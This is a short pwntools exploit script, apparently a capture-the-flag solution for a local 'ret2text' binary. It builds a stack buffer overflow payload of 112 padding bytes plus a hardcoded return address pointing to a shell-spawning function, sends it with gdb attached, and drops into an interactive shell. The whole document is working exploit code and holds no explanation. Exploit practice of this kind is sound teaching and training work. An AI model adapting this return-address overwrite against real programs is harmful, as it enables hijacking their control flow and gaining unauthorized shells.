from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

io = process('./ret2text_')

shell = 0x08049196
payload = b'A' * 112 + p32(shell)

gdb.attach(io)
io.send(payload)

io.interactive()